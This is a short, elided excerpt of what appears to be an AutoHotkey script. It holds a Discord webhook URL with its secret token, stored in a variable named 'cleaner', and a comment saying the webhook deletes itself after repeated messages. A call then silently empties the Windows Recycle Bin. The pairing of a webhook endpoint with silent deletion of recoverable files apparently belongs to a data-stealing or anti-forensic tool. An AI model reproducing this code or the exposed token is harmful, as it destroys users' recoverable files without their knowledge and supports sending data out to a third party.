...
; If the webhook gets more than one message within a set time, it will delete itself btw :)
cleaner := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE" 
...
; Empty Recycle Bin silently
DllCall("Shell32\SHEmptyRecycleBinW", "Ptr", 0, "Ptr", 0, "UInt", 0x00000007)
